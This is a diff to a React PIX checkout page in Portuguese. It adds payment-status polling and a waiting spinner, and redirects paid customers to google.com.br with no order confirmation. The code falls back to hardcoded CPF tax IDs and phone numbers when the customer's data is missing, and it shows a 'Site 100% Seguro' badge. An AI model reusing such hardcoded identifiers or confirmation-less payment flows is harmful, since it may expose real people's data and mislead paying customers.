@@ -1,5 +1,5 @@
 import React, { useEffect, useState } from 'react';
-    import { Shield, Copy, Clock } from 'lucide-react';
+    import { Shield, Copy, Clock, Loader2 } from 'lucide-react';
 
     interface PaymentResponse {
       qr_code?: string;
@@ -12,6 +12,7 @@ import React, { useEffect, useState } from 'react';
       pix: {
         pix_qr_code: string;
       };
+      status: string;
     }
 
 
@@ -26,13 +27,14 @@ import React, { useEffect, useState } from 'react';
       const [loading, setLoading] = useState(true);
       const [timerStarted, setTimerStarted] = useState(false);
       const [copyButtonColor, setCopyButtonColor] = useState("#ee4d2d");
+      const [paymentStatus, setPaymentStatus] = useState<string | null>(null);
 
       useEffect(() => {
         const generatePayment = async () => {
           const customerName = localStorage.getItem('CHECKOUT_NAME') || 'dasdasd asdasd';
           const customerEmail = localStorage.getItem('CHECKOUT_EMAIL') || 'dasdasd@dasdas.com';
-          const customerCPF = localStorage.getItem('CHECKOUT_CPF') || '01750899221';
-          const customerPhone = localStorage.getItem('CHECKOUT_PHONE') || '94984185145';
+          const customerCPF = localStorage.getItem('CHECKOUT_CPF') || '42158486104';
+          const customerPhone = localStorage.getItem('CHECKOUT_PHONE') || '11984456215';
           const utmParamsString = localStorage.getItem('utmParams');
           const utmParams = utmParamsString ? JSON.parse(utmParamsString) : {};
 
@@ -85,6 +87,7 @@ import React, { useEffect, useState } from 'react';
               setTimerStarted(true);
             }
             setLoading(false);
+            setPaymentStatus(data?.status || null);
 
           } catch (error) {
             console.error('Error generating payment:', error);
@@ -123,6 +126,12 @@ import React, { useEffect, useState } from 'react';
 
         return () => clearInterval(timer);
       }, [timerStarted]);
+
+      useEffect(() => {
+        if (transactionData?.status === 'paid') {
+          window.location.href = 'https://www.google.com.br';
+        }
+      }, [transactionData?.status]);
 
       const handleCopy = async () => {
         if (pixCode) {
@@ -196,6 +205,12 @@ import React, { useEffect, useState } from 'react';
                         <Copy size={20} />
                         <span>{copied ? 'Copiado!' : 'Copiar código PIX'}</span>
                       </button>
+                      {paymentStatus !== 'paid' && (
+                        <div className="flex items-center justify-center text-[#ee4d2d] space-x-2">
+                          <Loader2 size={16} className="animate-spin" color="#ee4d2d" />
+                          <span>Aguardando Pagamento</span>
+                        </div>
+                      )}
                     </div>
                   )}
                 </>
@@ -239,8 +254,8 @@ import React, { useEffect, useState } from 'react';
               <p>Este pagamento só pode ser realizado dentro do tempo, após este período, caso o pagamento não for confirmado sua solicitação será cancelada.</p>
             </div>
 
-            <div className="flex items-center justify-center text-gray-600 space-x-2">
-              <Shield size={20} />
+            <div className="flex items-center justify-center text-emerald-600 space-x-2">
+              <Shield size={20} fill="#48bb78" color="#48bb78" />
               <span>Site 100% Seguro</span>
             </div>
           </div>
